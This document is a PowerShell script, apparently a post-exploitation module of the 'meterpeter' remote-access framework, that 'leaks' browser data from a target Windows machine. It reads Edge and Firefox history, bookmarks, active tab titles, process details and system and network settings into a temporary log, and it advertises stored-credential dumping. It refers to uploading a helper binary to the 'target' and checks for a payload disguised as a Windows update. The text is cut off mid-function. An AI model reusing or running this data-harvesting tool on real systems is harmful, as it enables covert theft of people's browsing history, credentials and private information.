<#
.SYNOPSIS
  Standalone Powershell Script to Leak Installed Browsers Information.

  Author: r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: IE, Firefox, Chrome
  Optional Dependencies: mozlz4-win32.exe
  PS Script Dev Version: v1.18

.DESCRIPTION
   Standalone Powershell script to leak Installed browsers information sutch as: Home Page,
   Browsers Version, Accepted Language, Download Directory, History, Bookmarks, Extentions,
   StartPage, Stored Creds, Etc. The leaks will be saved to $env:TMP folder and Auto-deleted
   in the end. Unless the 2 argument is used to input the Logfile permanent storage location.

.NOTES
   PS C:\> Get-Help ./GetBrowsers.ps1 -full
   Access This cmdlet Comment_Based_Help

   mozlz4-win32.exe (Optional Dependencie)
   Used to convert firefox bookmarks files from: .jsonlz4 To: .json (More clean outputs)
   mozlz4-win32 requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1
   Display List of arguments available

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -RECON
   Fast Recon (Browsers and Versions Only)

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -FIREFOX
   Enumerates FireFox Browser information Only.

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -ALL
   Enumerates Internet Explorer (IE|MsEdge), FireFox and Chrome Browsers information.
   
.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -ADDONS $env:USERPROFILE\Desktop
   Enumerates ALL Browsers addons and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log

.INPUTS
   None. You cannot pipe objects to GetBrowsers.ps1

.OUTPUTS
   Saves BrowserEnum.log to the selected directory. 'tmp' is the default.

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
#>


# param (
#  [Parameter(Mandatory=$true,Position=0)]$IE,
#  [Parameter(Mandatory=$true,Position=0)]$RECON,
#  [Parameter(Mandatory=$true,Position=0)]$CHROME,
#  [Parameter(Mandatory=$true,Position=0)]$FIREFOX,
#  [Parameter(Mandatory=$false,Position=1)][string]$LOGFILEPATH
# )

$Path = $null
$mpset = $False
$param1 = $args[0] # User Inputs [Arguments]
$param2 = $args[1] # User Inputs [Arguments]
$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.18"
## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2";$mpset = $True}
If(-not($param1)){
    ## Required (Mandatory) Parameters/args Settings
    echo "`nGetBrowsers - Enumerate installed browser(s) information ." > $LogFilePath\BrowserEnum.log
    echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
    echo "Syntax: [scriptname] [-arg <mandatory>] [arg <optional>]`n" >> $LogFilePath\BrowserEnum.log
    echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -RECON            Fast recon (browsers and versions)" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -DEFAULTS         Enumerates remote sys default settings." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
    echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE `$env:TMP     Enumerates selected browser and stores logfile to 'tmp'.`n" >> $LogFilePath\BrowserEnum.log
    Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
        ## For those who insiste in running this script outside meterpeter
        If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
            Start-Sleep -Seconds 8
        }
    Exit
}


## [GetBrowsers] PS Script Banner (Manual Run)
# For those who insiste in running this script outside meterpeter
Write-Host "GetBrowsers - Enumerate installed browser(s) information." -ForeGroundColor Green
If($mpset -eq $True){Write-Host "[i] LogFile => $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow}
Start-sleep -Seconds 1

## Get System Default Configurations
$RHserver = "LogonServer  : "+"$env:LOGONSERVER"
$Caption = Get-CimInstance Win32_OperatingSystem|Format-List *|findstr /I /B /C:"Caption"
If($Caption){$ParseCap = $Caption -replace '                                   :','      :'}else{$ParseCap = "Caption      : Not Found"}

## Get System Default webBrowser
$DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
$MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";

## Get System UserAgent string
$IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object 'User Agent'
If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''}else{$ParsingIntSet = "UserAgent    : Not Found"}

## Internet statistics
$recstats = netstat -s -p IP|select-string -pattern "Packets Received"
If($recstats){$statsdata = $recstats -replace '  Packets Received                   =','TCPReceived  :'}else{$statsdata = "TCPReceived  : {null}"}
$delstats = netstat -s -p IP|select-string -pattern "Packets Delivered"
If($delstats){$deliverdata = $delstats -replace '  Received Packets Delivered         =','TCPDelivered :'}else{$deliverdata = "TCPDelivered : {null}"}

## Writting LogFile to the selected path in: { $param2 var }
echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
echo "---------------" >> $LogFilePath\BrowserEnum.log
echo "$RHserver" >> $LogFilePath\BrowserEnum.log
echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log

## Get InetAdaptor name
$InetAdaptor = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . -ErrorAction SilentlyContinue|Select-Object -Property [a-z]* -ExcludeProperty IPX*,WINS*|Select-Object -ExpandProperty "Description"
If(-not($InetAdaptor) -or $InetAdaptor -eq $null){echo "InetAdaptor  : {null}" >> $LogFilePath\BrowserEnum.log}else{echo "InetAdaptor  : $InetAdaptor" >> $LogFilePath\BrowserEnum.log}

## Get InetAdaptor Driver Name
$Driver = Get-NetAdapter|Select-Object -ExpandProperty "DriverName" -ErrorAction SilentlyContinue|Select -First 1
If(-not($Driver) -or $Driver -eq $null){echo "WiFiDriver   : {null}" >> $LogFilePath\BrowserEnum.log}else{echo "WiFiDriver   : $Driver" >> $LogFilePath\BrowserEnum.log}

## Get Flash Internal Name/Version
If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
    echo "flashName    : Not Found" >> $LogFilePath\BrowserEnum.log
}else{
    $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
    $flashName = $flash.versioninfo.InternalName
    echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
}

echo "$MInvocation" >> $LogFilePath\BrowserEnum.log
echo "$statsdata" >> $LogFilePath\BrowserEnum.log
echo "$deliverdata" >> $LogFilePath\BrowserEnum.log
## END Off { @args -DEFAULTS }


function ConvertFrom-Json20([object] $item){
    ## Json Files Convertion to text
    Add-Type -AssemblyName System.Web.Extensions
    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    return ,$ps_js.DeserializeObject($item)    
}


function BROWSER_RECON {
    ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
    $CheckVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($CheckVersion -lt '9.11.18362.0'){$ProcessName = "MicrosoftEdge"}else{$ProcessName = "msedge"}
    $IETestings = (Get-Process $ProcessName -ErrorAction SilentlyContinue).Responding
    If($IETestings -eq $True){$iStatus = "   Active"}else{$iStatus = "   Stoped"}
    $FFTestings = (Get-Process firefox -ErrorAction SilentlyContinue).Responding
    If($FFTestings -eq $True){$fStatus = "   Active"}else{$fStatus = "   Stoped"}
    $CHTestings = (Get-Process chrome -ErrorAction SilentlyContinue).Responding
    If($CHTestings -eq $True){$cStatus = "   Active"}else{$cStatus = "   Stoped"}

    ## Detect ALL Available browsers Installed and the PreDefined browser name
    $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
    If($DefaultBrowser){$MInvocation = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$MInvocation = $null}
    $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($IEVersion){$IEfound = "Found"}else{$IEfound = "False";$IEVersion = "{null}      "}
    $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -ErrorAction SilentlyContinue).version
    If($Chrome_App){$CHfound = "Found"}else{$CHfound = "False";$Chrome_App = "{null}       "}

    ## display predefined browser status
    If($MInvocation -match 'IE'){$id = "True";$fd = "False";$cd = "False"}
    If($MInvocation -match 'Chrome'){$id = "False";$fd = "False";$cd = "True"}
    If($MInvocation -match 'Firefox'){$id = "False";$fd = "True";$cd = "False"}
    If($MInvocation -match 'MSEdgeHTM'){$id = "True";$fd = "False";$cd = "False"}
    If(-not($MInvocation) -or $MInvocation -eq $null){$id = "{Null}";$fd = "{Null}";$cd = "{Null}"}

    ## leak Firefox installed version
    If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles")){
        $FFfound = "False";$ParsingData = "{null}"
    }else{
        $FFfound = "Found"
        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js")){
            If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js")){
                $ParsingData = "{null}"
            }else{
                $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"
                $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
                $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
            }
        }else{
            $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
            $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
            $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
        }
    }

    ## Build Table to display results found
    echo "`n`nBrowser   Install   Status   Version         PreDefined" > $LogFilePath\BrowserEnum.log
    echo "-------   -------   ------   -------         ----------" >> $LogFilePath\BrowserEnum.log
    echo "IE        $IEfound  $iStatus   $IEVersion    $id" >> $LogFilePath\BrowserEnum.log
    echo "CHROME    $CHfound  $cStatus   $Chrome_App   $cd" >> $LogFilePath\BrowserEnum.log
    echo "FIREFOX   $FFfound  $fStatus   $ParsingData          $fd`n" >> $LogFilePath\BrowserEnum.log
    ## Get-NetAdapter Interfaces
    $Interfaces = Get-NetAdapter|Select-Object Status,InterfaceDescription -ErrorAction SilentlyContinue
    echo $Interfaces >> $LogFilePath\BrowserEnum.log
}


function IE_Dump {
    ## Retrieve IE Browser Information
    echo "`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
    $CheckVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($CheckVersion -lt '9.11.18362.0'){$ProcessName = "MicrosoftEdge"}else{$ProcessName = "msedge"}
    $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
    If(-not($IEVersion) -or $IEVersion -eq $null){
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }else{
        $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
        $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
        $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
        $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
        $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
        $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
        $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
        $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
        $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
        $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
        $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
        $logfilefolder = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders").Cache
        $dataparse = "INetCache    : "+"$logfilefolder"

        ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
        $IETestings = (Get-Process $ProcessName -ErrorAction SilentlyContinue).Responding
        If(-not($IETestings) -or $IETestings -eq $null){
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires $ProcessName process running}"
            $FinalOut = "StartTime    : {requires $ProcessName process running}"
        }else{
            $Status = "Status       : Active"
            $BrowserStartTime = Get-Process $ProcessName|Select -ExpandProperty StartTime
            $StartTime = $BrowserStartTime[0];$FinalOut = "StartTime    : $StartTime"
            $ProcessPID = get-process $ProcessName|Select -Last 1|Select-Object -Expandproperty Id
            $PSID = "Process PID  : $ProcessPID"
        }

        ## Writting LogFile to the selected path in: { $param2 var }
        echo "$Status" >> $LogFilePath\BrowserEnum.log
        echo "$KBData" >> $LogFilePath\BrowserEnum.log
        echo "$IEData" >> $LogFilePath\BrowserEnum.log
        echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
        echo "$dataparse" >> $LogFilePath\BrowserEnum.log
    }

    ## leak MicrosoftEdge.exe (OR: msedge.exe) binary path
    $BinaryPath = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($BinaryPath) -or $BinaryPath -eq $null){
        echo "BinaryPath   : {requires $ProcessName process running}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPath = Get-Process $ProcessName|Select -ExpandProperty Path
        $parseData = $BinaryPath[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }
    ## leak From previous Functions { StartTime|PID }
    echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
    echo "$PSID" >> $LogFilePath\BrowserEnum.log

    ## leak IE Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $checkProcess = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($checkProcess) -or $checkProcess -eq $null){
        echo "{requires $ProcessName process running}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process $ProcessName | Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Microsoft​ Edge',''
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve IE history URLs
    # "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    # Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"
    echo "`nIE History" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History")){
        ## Retrieve History from iexplorer if not found MsEdge binary installation ..
        $Finaltest = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue
        If(-not($Finaltest) -or $Finaltest -eq $null){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
        }else{
            Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
        }
    }else{
        $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $MsEdgeHistory = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
        Get-Content "$MsEdgeHistory"|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique >> $LogFilePath\BrowserEnum.log
    }

    ## TODO: Retrieve IE Favorites
    # "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs" (IEFP)
    echo "`nIE Favorites" >> $LogFilePath\BrowserEnum.log
    echo "------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*")){
        echo "{Could not find any Favorites}" >> $LogFilePath\BrowserEnum.log
    }else{
        $LocalDirPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*"
        $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https" # Test.txt and test2.txt (test Files) ..
        ForEach ($Token in $DumpFileData){
            $Token = $Token -replace ' ',''
            echo $Token >> $LogFilePath\BrowserEnum.log
        }
    }

    ## Retrieve IE Bookmarks
    echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks")){
        echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
    }else{
        $LocalDirPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
        $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https"
        ForEach ($Token in $DumpFileData){
            $Token = $Token -replace '"','' -replace 'url:','' -replace ' ',''
            echo $Token >> $LogFilePath\BrowserEnum.log
        }
    }
}


function FIREFOX {
    ## Retrieve FireFox Browser Information
    echo "`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log
    ## Set the Location of firefox prefs.js file
    If(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles"){
        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js")){
            $FirefoxProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"
            $stupidTrick = $True
        }else{
            $FirefoxProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js" 
        }

        ## Check browser: { active|StartTime|PID } Settings
        $FFTestings = (Get-Process Firefox -ErrorAction SilentlyContinue).Responding
        If($FFTestings -eq $True){
            $Status = "Status       : Active"
            $BsT = Get-Process Firefox|Select -ExpandProperty StartTime
            $StartTime = $BsT[0];$FinalOut = "StartTime    : $StartTime"
            $SSID = get-process Firefox|Select -Last 1|Select-Object -Expandproperty Id
            $PSID = "Process PID  : $SSID"
            echo "$Status" >> $LogFilePath\BrowserEnum.log
        }else{
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires Firefox process running}"
            $FinalOut = "StartTime    : {requires Firefox process running}"
            echo "$Status" >> $LogFilePath\BrowserEnum.log
        }

        ## Get browser countryCode { PT }
        $JsPrefs = Get-content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.search.region";
        $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.search.region','countryCode  '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log

        ## Get Browser Version { 76.0.11 }
        $JsPrefs = Get-content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "extensions.lastPlatformVersion"
        $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'extensions.lastPlatformVersion','Version      '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log

        ## Get Flash Version { 32.0.0.314 }
        $JsPrefs = Get-content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "plugin.flash.version"
        If(-not($JsPrefs) -or $JsPrefs -eq $null){
            echo "FlashVersion : {null}" >> $LogFilePath\BrowserEnum.log
        }else{
            $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'plugin.flash.version','FlashVersion '
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }

        ## Get brownser startup page { https://www.google.pt }
        $JsPrefs = Get-content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.startup.homepage"
        If($stupidTrick -eq $True){
            $ParseData = $JsPrefs -split(';');$Strip = $ParseData[0]
            $ParsingData = $Strip -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\)','' -replace 'browser.startup.homepage','HomePage     '
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }else{
            $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage','HomePage     '
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }

        ## Get browser.download.dir { C:\Users\pedro\Desktop }
        $JsPrefs = Get-Content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.download.dir";
        If(-not($JsPrefs) -or $JsPrefs -eq $null){
            ## Test with browser.download.lastDir
            $JsPrefs = Get-Content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.download.lastDir"
            If(-not($JsPrefs) -or $JsPrefs -eq $null){
                echo "Downloads    : {null}" >> $LogFilePath\BrowserEnum.log
            }else{
                $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads    '
                If($ParsingData -match '\\\\'){$ParsingData = $ParsingData -replace '\\\\','\'}
                echo "$ParsingData" >> $LogFilePath\BrowserEnum.log            
            }
        }else{
            $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.dir','Downloads    '
            If($ParsingData -match '\\\\'){$ParsingData = $ParsingData -replace '\\\\','\'}
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }
    }else{
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }

    ## Get Firefox.exe binary path
    $BinaryPath = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($BinaryPath) -or $BinaryPath -eq $null){
        echo "BinaryPath   : {requires firefox process running}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPath = Get-Process firefox|Select -ExpandProperty Path
        $parseData = $BinaryPath[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }
    ## leak From previous Functions { StartTime|PID }
    echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
    echo "$PSID" >> $LogFilePath\BrowserEnum.log

    ## Get Firefox Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $checkProcess = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($checkProcess)){
        echo "{requires firefox process running}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process firefox|Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Mozilla Firefox',''
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## leak FIREFOX HISTORY URLs
    # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
    echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log
    If(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"){
        $Profiles = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"
        $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        Get-Content $Profiles\places.sqlite -ErrorAction SilentlyContinue|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
            $Value = New-Object -TypeName PSObject -Property @{
                FireFoxHistoryURL = $_
            }
            if ($Value -match $Search) {
                $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
                echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
            }
        }

    }else{

        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default")){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log 
        }else{
            $Profiles = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default"
            $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            Get-Content $Profiles\places.sqlite -ErrorAction SilentlyContinue|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
                $Value = New-Object -TypeName PSObject -Property @{
                    FireFoxHistoryURL = $_
                }
                if ($Value -match $Search) {
                    $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
                    echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
                }  
            }
        }
    }

    ## Retrieve FireFox bookmarks
    # TODO: Need to test it on IEFP computer
    echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "-----------------" >> $LogFilePath\BrowserEnum.log
    $IPATH = pwd;$AlternativeDir = $False
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release")){
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4"   
    }else{
        $AlternativeDir = $True
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*.jsonlz4" 
    }

    If(-not(Test-Path -Path "$Bookmarks_Path")) {
        echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
    }else{
        If($AlternativeDir -eq $True){
            ## Store 1º bookmark file into { $Final } local var
            cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\"
            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*"
            $parse = $StorePath|Select-Object -ExpandProperty name
            $Final = $parse[0]
            ## Copy .Jsonlz4 file to $env:tmp directory
            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
        }else{
            ## Store 1º bookmark file into { $Final } local var
            cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\"
            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*"
            $parse = $StorePath|Select-Object -ExpandProperty name
            $Final = $parse[0]
            ## Copy .Jsonlz4 file to $env:tmp directory
            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
        }
    
        If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
            echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
            echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
            echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe}" >> $LogFilePath\BrowserEnum.log
            ## mozlz4-win32.exe Firefox Fail dependencie bypass
            # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
            # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
            $Json = Get-Content "$Bookmarks_Path" -Raw
            $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
